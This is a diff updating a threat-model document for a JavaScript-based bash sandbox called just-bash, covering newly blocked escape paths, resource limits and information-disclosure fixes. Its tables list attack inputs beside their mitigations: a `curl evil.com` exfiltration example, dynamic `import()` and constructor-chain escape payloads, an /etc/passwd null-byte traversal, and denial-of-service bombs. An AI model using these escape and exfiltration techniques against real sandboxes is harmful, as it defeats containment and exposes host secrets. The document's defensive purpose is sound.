@@ -67,7 +67,9 @@ The following components are **trusted** and outside the scope of just-bash's ru
 │  │  ┌───────────────────────────────────────────────────┐    │  │
 │  │  │ Defense-in-Depth (SECONDARY)                      │    │  │
 │  │  │ AsyncLocalStorage context-aware monkey-patching   │    │  │
-│  │  │ Blocks: Function, eval, setTimeout, process.*     │    │  │
+│  │  │ Blocks: Function, eval, setTimeout, process.*,   │    │  │
+│  │  │   performance, Module._resolveFilename,           │    │  │
+│  │  │   __defineGetter__/__defineSetter__, stdout/stderr │    │  │
 │  │  └───────────────────────────────────────────────────┘    │  │
 │  └───────────────────────────────────────────────────────────┘  │
 │                                                                 │
@@ -107,6 +109,7 @@ The following components are **trusted** and outside the scope of just-bash's ru
 | Cmd substitution depth | `$($($($(…))))` | maxSubstitutionDepth (50) | `src/limits.ts` |
 | String growth | `${x//a/aaaa}` in loop | maxStringLength (10MB) + mid-loop check | `src/interpreter/expansion/parameter-ops.ts` |
 | Glob bomb | `**/*` across large FS | maxGlobOperations (100K) | `src/limits.ts` |
+| Glob depth bomb | `**/**/**/**/**/**/x` | MAX_GLOBSTAR_SEGMENTS (5) rejects excessive `**` segments | `src/shell/glob.ts` |
 | Var indirection chain | `a=b; b=c; …` 100+ deep | Hardcoded depth > 100 check | `src/interpreter/arithmetic.ts` |
 | IFS injection | Custom IFS to split commands | IFS only affects word splitting, not parsing | `src/interpreter/helpers/ifs.ts` |
 | Arithmetic overflow | `$((2**63))` | Clamped to MAX_SAFE_INTEGER, no 64-bit | `src/parser/arithmetic-primaries.ts` |
@@ -148,13 +151,14 @@ The following components are **trusted** and outside the scope of just-bash's ru
 | process.binding() | Access native modules | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
 | process.dlopen() | Load native addons | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
 | Module._load() | CJS module loading | Blocked by defense-in-depth proxy | `src/security/defense-in-depth-box.ts` |
+| Module._resolveFilename() | Module resolution (require + import) | Blocked by defense-in-depth proxy — partially mitigates `import()` for file-based specifiers | `src/security/defense-in-depth-box.ts` |
 | process.mainModule | Access main module (CJS) | Blocked via defineProperty getter | `src/security/defense-in-depth-box.ts` |
 | Error.prepareStackTrace | Leak Function via stack frames | Set blocked via defineProperty | `src/security/defense-in-depth-box.ts` |
 | WebAssembly | Compile/run arbitrary code | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
 | Proxy constructor | Create intercepting proxies | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
 | WeakRef/FinalizationRegistry | GC observation/side channels | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
 | process.chdir() | Confuse CWD tracking | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
-| **dynamic import()** | `import('/tmp/evil.js')` | **CANNOT BE BLOCKED** (see §4.1) | N/A |
+| **dynamic import()** | `import('/tmp/evil.js')` | **BLOCKED**: `Module._resolveFilename` blocks file specifiers; ESM loader hooks block `data:`/`blob:` URLs (Node.js 20.6+; see §4.1) | `src/security/defense-in-depth-box.ts` |
 | child_process | spawn/exec/fork | Not imported anywhere; no code path from interpreter | Architecture |
 
 ### 3.6 Information Disclosure
@@ -164,6 +168,7 @@ The following components are **trusted** and outside the scope of just-bash's ru
 | process.env | Leak API keys, secrets | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
 | process.argv | CLI args with secrets | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
 | process.execPath | Reveal Node.js path | Blocked via defineProperty | `src/security/defense-in-depth-box.ts` |
+| process.stdout/stderr | Bypass interpreter output | Blocked by defense-in-depth (workers); skipped in main thread due to console.log dependency | `src/security/blocked-globals.ts` |
 | process.connected | IPC connection status | Blocked in **worker contexts only** (WorkerDefenseInDepth) | `src/security/defense-in-depth-box.ts` |
 | process.send | IPC messaging to parent | Blocked in **worker contexts only** (WorkerDefenseInDepth); main thread skipped to avoid interfering with test runners/process managers | `src/security/blocked-globals.ts` |
 | process.channel | IPC channel access | Blocked in **worker contexts only** (WorkerDefenseInDepth); main thread skipped for same reason | `src/security/blocked-globals.ts` |
@@ -171,6 +176,7 @@ The following components are **trusted** and outside the scope of just-bash's ru
 | hostname/whoami/uname | System enumeration | Return generic/virtual values | `src/commands/hostname/` |
 | Error messages | Reveal file paths | `sanitizeError()` in FS layers + `sanitizeErrorMessage()` at all error choke points (builtin-dispatch, Bash.ts, CLI, Python bridge) | `src/fs/real-fs-utils.ts`, `src/interpreter/builtin-dispatch.ts`, `src/Bash.ts`, `src/cli/just-bash.ts` |
 | Timing side-channels | hrtime, cpuUsage, memoryUsage | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
+| performance.now() | Sub-ms timing for side-channels | Blocked by defense-in-depth; internal uses pre-capture `_performanceNow` | `src/security/blocked-globals.ts`, `src/timers.ts` |
 
 ### 3.7 Denial of Service
 
@@ -185,6 +191,9 @@ The following components are **trusted** and outside the scope of just-bash's ru
 | process.abort() | Crash host process | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
 | process.kill() | Signal host/other procs | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
 | AWK/SED loops | Runaway text processing | maxAwkIterations (10K), maxSedIterations (10K) | `src/limits.ts` |
+| Source depth bomb | Self-sourcing script | maxSourceDepth (100) | `src/limits.ts`, `src/interpreter/builtins/source.ts` |
+| FD exhaustion | `exec N>/dev/null` in loop | `checkFdLimit()` enforces maxFileDescriptors (1024) before every `fileDescriptors.set()` | `src/interpreter/helpers/result.ts` |
+| Glob `**` depth | `**/**/**/**/**/**/x` | MAX_GLOBSTAR_SEGMENTS (5) rejects patterns with excessive recursive segments | `src/shell/glob.ts` |
 
 ### 3.8 Privilege Escalation
 
@@ -205,28 +214,31 @@ The following components are **trusted** and outside the scope of just-bash's ru
 | JQ/query field access | JSON keys from data | `DANGEROUS_KEYS` Set + `safeGet()`/`safeSet()` | `src/commands/query-engine/safe-object.ts` |
 | HTTP response headers | Header names from responses | `Object.create(null)` for header objects | `src/network/fetch.ts` |
 | Env export to commands | Passing env to subprocesses | `mapToRecord()` produces null-prototype objects | `src/helpers/env.ts` |
+| `__defineGetter__`/`__defineSetter__` | Inject getters/setters on prototypes | Blocked by defense-in-depth (strategy: "throw") | `src/security/blocked-globals.ts` |
+| `__lookupGetter__`/`__lookupSetter__` | Introspect prototype getters/setters | Blocked by defense-in-depth (strategy: "throw") | `src/security/blocked-globals.ts` |
+| JSON/Math mutation | Poison shared utility objects | Frozen by defense-in-depth (strategy: "freeze") | `src/security/blocked-globals.ts` |
 
 ---
 
 ## 4. Known Gaps & Residual Risks
 
-### 4.1 CRITICAL: Dynamic import() Cannot Be Blocked
+### 4.1 Dynamic import() Mitigated (Three Layers)
 
-**Risk**: HIGH (but mitigated at other layers)
+**Risk**: LOW (comprehensively mitigated on Node.js 20.6+)
 
-Dynamic `import()` is a language-level keyword, not a property on any object. It cannot be intercepted by Proxy, defineProperty, or any monkey-patching technique.
+Dynamic `import()` is a language-level keyword, not a property on any object. It cannot be intercepted by Proxy or defineProperty. However, it CAN be intercepted via Node.js ESM loader hooks.
 
 **Attack scenario**: If attacker achieves JS code execution → `import('data:text/javascript,...')` → full escape.
 
-**Mitigations**:
-1. OverlayFs writes to memory only — attacker cannot write .js files to real filesystem
-2. InMemoryFs has no real filesystem backing at all
-3. The bash interpreter never calls `import()` based on user input — no code path exists
-4. All paths from bash to JS code execution (Function, eval, setTimeout, constructor chains) are blocked
+**Mitigations** (three layers):
+1. **Module._resolveFilename blocked** — file-based `import()` specifiers (e.g., `import('/tmp/evil.js')`) are intercepted at the CJS module resolution level and blocked
+2. **ESM loader hooks** — `module.registerHooks()` (Node.js 23.5+) or `module.register()` (Node.js 20.6+) installs hooks that reject `data:` and `blob:` URL specifiers process-wide. No CLI flags required.
+3. **Filesystem restrictions** — OverlayFs writes to memory only, InMemoryFs has no real FS backing, so attacker cannot write .js files to the real filesystem
+4. **Architecture** — no code path exists from bash interpretation to JS execution; all paths (Function, eval, setTimeout, constructor chains) are blocked
 
-**Residual risk**: If a bug in the interpreter allows JavaScript code execution (bypassing Function/eval blocks), `import()` becomes an unblockable escalation path.
+**Residual risk**: On Node.js < 20.6 where `module.register()` is unavailable, `data:` URL imports remain unblockable. For those deployments, use `--experimental-loader` CLI hooks as an additional layer.
 
-**Deployment-level mitigation**: Node.js `--experimental-loader` hooks can intercept `import()` calls at the module resolution level. This is outside just-bash's scope but recommended for strict deployments where defense-in-depth against `import()` is required.
+**Note**: The ESM loader hooks are process-wide and permanent (cannot be unregistered). This is an accepted trade-off — `data:` and `blob:` URL imports are essentially never used in production Node.js applications.
 
 ### 4.2 Pre-Captured References Bypass Defense-in-Depth
 
@@ -260,9 +272,9 @@ No systematic testing for invalid UTF-8, homograph attacks, or RTL override char
 
 ### 4.6 File Descriptor Manipulation
 
-**Risk**: LOW
+**Risk**: LOW (mitigated)
 
-No tests for `/dev/fd/` access. The virtual filesystem doesn't implement `/dev/fd/`.
+FD exhaustion is now enforced: `checkFdLimit()` is called before every `fileDescriptors.set()` across interpreter.ts, redirections.ts, and subshell-group.ts, enforcing `maxFileDescriptors` (default: 1024). No tests for `/dev/fd/` access — the virtual filesystem doesn't implement `/dev/fd/`.
 
 ### 4.7 Python Execution Surface (When Enabled)
 
@@ -301,7 +313,7 @@ When `python: true`, CPython 3.13 Emscripten provides full Python execution via 
 
 **Risk**: LOW (mitigated)
 
-Error sanitization is now systematic: `sanitizeError()` in FS layers (OverlayFs, ReadWriteFs) strips `.path` from `ErrnoException` objects, and `sanitizeErrorMessage()` strips OS paths and stack traces from raw error messages at all major choke points (builtin-dispatch catch-all, `Bash.exec()` error handlers, CLI error outputs, Python FS bridge). Remaining risk is limited to custom commands that catch and re-format errors without using the sanitization function.
+Error sanitization is now systematic: `sanitizeError()` in FS layers (OverlayFs, ReadWriteFs) strips `.path` from `ErrnoException` objects, and `sanitizeErrorMessage()` strips OS paths, Node.js internal module paths (`node:internal/...`), and stack traces from raw error messages at all major choke points (builtin-dispatch catch-all, `Bash.exec()` error handlers including SecurityViolationError and ExecutionLimitError, CLI error outputs, Python FS bridge). Remaining risk is limited to custom commands that catch and re-format errors without using the sanitization function.
 
 ### 4.9 Heredoc Expansion Interaction
 
@@ -332,7 +344,7 @@ Heredocs with variable expansion are size-limited (10MB) but nested heredocs wit
 | **re2js regex engine** | Primary | ReDoS | High — linear-time guarantee (no backtracking) |
 | **Defense-in-depth** (globals) | Secondary | JS escape | Medium — monkey-patching has inherent limits |
 | **Virtual process info** | Secondary | Info disclosure | High — no real values exposed |
-| **Error sanitization** | Secondary | Info disclosure | High — systematic at FS layers + all error choke points |
+| **Error sanitization** | Secondary | Info disclosure | High — systematic at FS layers + all error choke points + node:internal paths |
 
 ---
 
@@ -345,7 +357,7 @@ Heredocs with variable expansion are size-limited (10MB) but nested heredocs wit
 | 3 | Access process.env | No bash→JS path. If bug: defense-in-depth → throw | **BLOCKED** (arch + secondary) |
 | 4 | Infinite loop | `while true; do :; done` → maxLoopIterations → throw | **BLOCKED** (limits) |
 | 5 | Prototype pollution | `arr[__proto__]=evil` → Map/null-prototype → no effect | **BLOCKED** (data guards) |
-| 6 | dynamic import() escape | Hypothetical JS exec → `import('data:...')` | **RESIDUAL RISK** (no path exists today) |
+| 6 | dynamic import() escape | Hypothetical JS exec → `import('data:...')` → ESM hooks block data:/blob: URLs | **BLOCKED** (Node.js 20.6+; residual on older) |
 | 7 | Network exfiltration | `curl evil.com` → network off → curl not registered | **BLOCKED** (network isolation) |
 | 8 | process.exit() | No bash→JS path. If bug: defense-in-depth → throw | **BLOCKED** (arch + secondary) |
 | 9 | Brace expansion OOM | `{1..999999999}` → maxBraceExpansionResults → truncated | **BLOCKED** (limits) |
@@ -355,15 +367,31 @@ Heredocs with variable expansion are size-limited (10MB) but nested heredocs wit
 | 13 | Null byte injection | `cat "file\x00../../etc/passwd"` → `validatePath()` → rejected | **BLOCKED** (path validation) |
 | 14 | Error path leak | FS error with real path → `sanitizeError()` → path stripped | **BLOCKED** (error sanitization) |
 | 15 | Constructor chain | `({}).constructor.constructor('code')()` → constructor patched → throw | **BLOCKED** (defense-in-depth) |
+| 16 | Source depth bomb | Self-sourcing `source /s.sh` → maxSourceDepth (100) → throw | **BLOCKED** (limits) |
+| 17 | FD exhaustion | `exec N>/dev/null` loop → checkFdLimit → maxFileDescriptors (1024) → throw | **BLOCKED** (limits) |
+| 18 | Glob `**` depth | `**/**/**/**/**/**/x` → MAX_GLOBSTAR_SEGMENTS (5) → throw | **BLOCKED** (limits) |
+| 20 | performance.now() timing | Sub-ms timing attack → blocked by defense-in-depth | **BLOCKED** (secondary) |
+| 21 | Prototype pollution via `__defineGetter__` | Inject getter on prototype → blocked by defense-in-depth | **BLOCKED** (secondary) |
+| 22 | File-based import() | `import('/tmp/evil.js')` → Module._resolveFilename blocked → throw | **BLOCKED** (secondary) |
+| 23 | data: URL import() | `import('data:text/javascript,...')` → ESM loader hooks → throw | **BLOCKED** (Node.js 20.6+) |
 
 ---
 
 ## 7. Recommendations for Future Hardening
 
-1. **`--experimental-loader` for import() blocking** — Use Node.js module resolution hooks to intercept and block dynamic imports within sandbox contexts
-2. ~~**Systematic error message audit**~~ — **IMPLEMENTED**: `sanitizeErrorMessage()` applied at all error choke points; strips OS paths and stack traces
+1. ~~**`--experimental-loader` for import() blocking**~~ — **IMPLEMENTED**: ESM loader hooks via `module.register()` (Node.js 20.6+) / `module.registerHooks()` (Node.js 23.5+) block `data:` and `blob:` URL imports process-wide. Combined with `Module._resolveFilename` blocking for file specifiers, `import()` is fully mitigated on Node.js 20.6+. No CLI flags required.
+2. ~~**Systematic error message audit**~~ — **IMPLEMENTED**: `sanitizeErrorMessage()` applied at all error choke points; strips OS paths, `node:internal/` paths, and stack traces
 3. **Content Security Policy for output** — Consider sanitizing output to prevent XSS when sandbox output is rendered in web contexts
 4. **Expand fuzzing corpus** — Add grammar rules for trap, job control (`&`, `fg`, `bg`), and deeply nested heredocs with expansion
 5. **Total memory ceiling** — Track total memory allocated per `exec()` call to provide a hard memory ceiling (not just per-object limits)
 6. ~~**process.connected / process.send / process.channel**~~ — **IMPLEMENTED**: Blocked via defense-in-depth (proxy for send/channel, defineProperty for connected)
 7. ~~**process.chdir**~~ — **IMPLEMENTED**: Blocked via defense-in-depth proxy
+8. ~~**import() expression blocking**~~ — **IMPLEMENTED**: `Module._resolveFilename` blocked by defense-in-depth proxy (data: URLs still bypass)
+9. ~~**source/. depth limit**~~ — **IMPLEMENTED**: maxSourceDepth (100) enforced in `handleSource()`
+10. ~~**process.stdout/stderr blocking**~~ — **IMPLEMENTED**: Blocked via defense-in-depth in worker contexts; skipped in main thread (console.log dependency)
+11. ~~**performance.now() blocking**~~ — **IMPLEMENTED**: Blocked via defense-in-depth; internal uses pre-captured `_performanceNow`
+13. ~~**Stack trace sanitization**~~ — **IMPLEMENTED**: `sanitizeErrorMessage()` applied to SecurityViolationError and ExecutionLimitError in `Bash.exec()`; `node:internal/` paths stripped
+14. ~~**FD exhaustion enforcement**~~ — **IMPLEMENTED**: `checkFdLimit()` before every `fileDescriptors.set()` across interpreter, redirections, subshell-group
+15. ~~**Glob pattern depth limit**~~ — **IMPLEMENTED**: MAX_GLOBSTAR_SEGMENTS (5) rejects patterns with excessive `**` segments
+16. ~~**Intl/TextDecoder/TextEncoder audit**~~ — **ACCEPTED RISK**: Used by 40+ internal files; no escape vectors; documented in blocked-globals.ts
+17. ~~**Frozen builtins**~~ — **IMPLEMENTED**: `__defineGetter__`/`__defineSetter__`/`__lookupGetter__`/`__lookupSetter__` blocked; JSON and Math frozen
